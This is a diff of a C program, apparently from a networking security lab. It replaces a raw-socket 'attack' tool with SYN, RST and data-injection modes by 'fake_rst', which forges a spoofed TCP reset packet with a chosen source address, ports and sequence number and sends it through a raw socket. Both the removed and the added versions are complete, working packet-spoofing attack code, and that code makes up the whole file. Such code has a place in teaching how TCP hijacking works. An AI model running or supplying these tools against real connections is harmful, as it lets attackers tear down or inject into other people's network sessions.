@@ -1,114 +1,176 @@
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <sys/socket.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
-#include <sys/socket.h>
-#include <stdint.h>
 
-// IP checksum
-unsigned short csum_ip(unsigned short *buf, int nwords) {
-    unsigned long sum;
-    for (sum = 0; nwords > 0; nwords--)
-        sum += *buf++;
-    while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
-    return ~sum;
-}
+#define PCKT_LEN 8192
 
-// TCP checksum (prof version)
-unsigned short csum_tcp(unsigned short *buf, int nwords) {
-    unsigned long sum = 0;
+//------------------------------------------------------------
+// Checksum Helpers
+//------------------------------------------------------------
+unsigned short checksum(unsigned short *ptr, int nbytes)
+{
+    long sum = 0;
+    unsigned short oddbyte;
+    unsigned short answer;
 
-    sum += buf[6];
-    sum += buf[7];
-    sum += buf[8];
-    sum += buf[9];
-
-    sum += htons(6);
-    sum += htons(20 + (nwords << 1));
-
-    for (int i = 10; i < 20 + nwords; i++)
-        sum += buf[i];
-
-    while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
-    return ~sum;
-}
-
-int main(int argc, char *argv[]) {
-
-    if (argc < 8) {
-        printf("Usage:\n");
-        printf("  SYN attack : sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n");
-        printf("  RST attack : sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n");
-        printf("  DATA attack: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
-        return 1;
+    while (nbytes > 1) {
+        sum += *ptr++;
+        nbytes -= 2;
     }
 
-    char mode = argv[1][0];
-    char *src_ip = argv[2];
-    int src_port = atoi(argv[3]);
-    char *dst_ip = argv[4];
-    int dst_port = atoi(argv[5]);
-    uint32_t seq = strtoul(argv[6], NULL, 10);
-    uint32_t ack = strtoul(argv[7], NULL, 10);
+    if (nbytes == 1) {
+        oddbyte = 0;
+        *((unsigned char *) &oddbyte) = *(unsigned char *)ptr;
+        sum += oddbyte;
+    }
 
-    char packet[4096];
+    // fold 32-bit sum to 16 bits
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    answer = (unsigned short) ~sum;
+
+    return answer;
+}
+
+//------------------------------------------------------------
+// Pseudo Header for TCP checksum
+//------------------------------------------------------------
+struct pseudo_header {
+    unsigned int src;
+    unsigned int dst;
+    unsigned char zero;
+    unsigned char protocol;
+    unsigned short tcp_len;
+};
+
+//------------------------------------------------------------
+// MAIN
+//------------------------------------------------------------
+int main(int argc, char *argv[])
+{
+    // usage: ./fake_rst <src_ip> <src_port> <dst_ip> <dst_port> <seq>
+    if (argc != 6) {
+        fprintf(stderr,
+                "usage: %s <src_ip> <src_port> <dst_ip> <dst_port> <seq>\n",
+                argv[0]);
+        exit(1);
+    }
+
+    const char *src_ip = argv[1];
+    int src_port = atoi(argv[2]);
+    const char *dst_ip = argv[3];
+    int dst_port = atoi(argv[4]);
+    unsigned int seq = strtoul(argv[5], NULL, 10);   // raw 32-bit seq
+
+    // Raw socket at TCP layer
+    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sd < 0) {
+        perror("socket");
+        exit(1);
+    }
+
+    // We provide our own IP header
+    int one = 1;
+    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt(IP_HDRINCL)");
+        close(sd);
+        exit(1);
+    }
+
+    char packet[PCKT_LEN];
     memset(packet, 0, sizeof(packet));
 
-    struct iphdr  *iph  = (struct iphdr *)packet;
-    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
-    char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
+    struct iphdr  *ip  = (struct iphdr *)packet;
+    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
 
-    int payload_len = 0;
-    if (mode == 'D') {
-        strcpy(data, argv[8]);
-        payload_len = strlen(argv[8]);
+    //------------------------------------------------------------
+    // Fill IP header
+    //------------------------------------------------------------
+    ip->ihl      = 5;              // 20-byte IP header
+    ip->version  = 4;
+    ip->tos      = 0;
+    ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+    ip->id       = htons(54321);   // arbitrary
+    ip->frag_off = 0;
+    ip->ttl      = 64;
+    ip->protocol = IPPROTO_TCP;
+    ip->check    = 0;              // filled after
+    ip->saddr    = inet_addr(src_ip);
+    ip->daddr    = inet_addr(dst_ip);
+
+    //------------------------------------------------------------
+    // Fill TCP header
+    //------------------------------------------------------------
+    tcp->source  = htons(src_port);
+    tcp->dest    = htons(dst_port);
+    tcp->seq     = htonl(seq);     // sequence we pass in
+    tcp->ack_seq = 0;              // RST without ACK
+    tcp->doff    = 5;              // 20-byte TCP header
+    tcp->syn     = 0;
+    tcp->ack     = 0;
+    tcp->psh     = 0;
+    tcp->fin     = 0;
+    tcp->urg     = 0;
+    tcp->rst     = 1;              // <-- important bit
+    tcp->window  = htons(0);
+    tcp->check   = 0;              // filled after
+    tcp->urg_ptr = 0;
+
+    //------------------------------------------------------------
+    // TCP checksum (pseudo header + TCP header)
+    //------------------------------------------------------------
+    struct pseudo_header psh;
+    psh.src      = ip->saddr;
+    psh.dst      = ip->daddr;
+    psh.zero     = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_len  = htons(sizeof(struct tcphdr));
+
+    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
+    char *pseudogram = malloc(psize);
+    if (!pseudogram) {
+        perror("malloc");
+        close(sd);
+        exit(1);
     }
 
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
-    iph->id = htons(54321);
-    iph->frag_off = 0;
-    iph->ttl = 64;
-    iph->protocol = 6;
-    iph->saddr = inet_addr(src_ip);
-    iph->daddr = inet_addr(dst_ip);
-    iph->check = 0;
+    memcpy(pseudogram, &psh, sizeof(psh));
+    memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr));
 
-    tcph->source = htons(src_port);
-    tcph->dest = htons(dst_port);
-    tcph->seq = htonl(seq);
-    tcph->ack_seq = htonl(ack);
-    tcph->doff = 5;
-    tcph->window = htons(65535);
+    tcp->check = checksum((unsigned short *)pseudogram, psize);
+    free(pseudogram);
 
-    tcph->syn = tcph->ack = tcph->psh = tcph->rst = tcph->fin = tcph->urg = 0;
+    //------------------------------------------------------------
+    // IP checksum
+    //------------------------------------------------------------
+    ip->check = checksum((unsigned short *)packet, ip->ihl * 4);
 
-    if (mode == 'S') tcph->syn = 1;
-    if (mode == 'R') { tcph->rst = 1; tcph->ack = 1; }
-    if (mode == 'D') { tcph->psh = 1; tcph->ack = 1; }
-
-    iph->check = csum_ip((unsigned short*)packet, 10);
-
-    int nwords = (payload_len + 1) / 2;
-    tcph->check = 0;
-    tcph->check = csum_tcp((unsigned short*)packet, nwords);
-
-    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    int one = 1;
-    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-
+    //------------------------------------------------------------
+    // Send packet
+    //------------------------------------------------------------
     struct sockaddr_in sin;
-    sin.sin_family = AF_INET;
-    sin.sin_addr.s_addr = iph->daddr;
+    memset(&sin, 0, sizeof(sin));
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = htons(dst_port);  // not really used by raw IP
+    sin.sin_addr.s_addr = ip->daddr;
 
-    sendto(s, packet, sizeof(struct iphdr)+sizeof(struct tcphdr)+payload_len,
-           0, (struct sockaddr*)&sin, sizeof(sin));
+    if (sendto(sd,
+               packet,
+               sizeof(struct iphdr) + sizeof(struct tcphdr),
+               0,
+               (struct sockaddr *)&sin,
+               sizeof(sin)) < 0) {
+        perror("sendto");
+    } else {
+        printf("Spoofed RST sent: %s:%d -> %s:%d  seq=%u\n",
+               src_ip, src_port, dst_ip, dst_port, seq);
+    }
 
-    printf("Attack %c sent.\n", mode);
+    close(sd);
     return 0;
 }
